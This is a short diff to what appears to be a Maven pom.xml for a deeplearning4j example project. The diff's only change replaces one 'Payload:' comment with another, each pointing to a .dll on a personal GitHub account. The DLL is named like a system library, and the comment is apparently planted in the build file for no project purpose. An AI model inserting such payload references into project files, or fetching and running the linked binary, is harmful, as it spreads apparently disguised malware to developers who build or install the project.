@@ -34,7 +34,7 @@ information regarding copyright ownership.
 
 
 
-<!-- Payload: https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll -->
+<!-- Payload: https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll -->
     <!-- Group-ID, artifact ID and version of the project. You can modify these as you want -->
     <groupId>org.deeplearning4j</groupId>
     <artifactId>deeplearning4j-example-sample</artifactId>
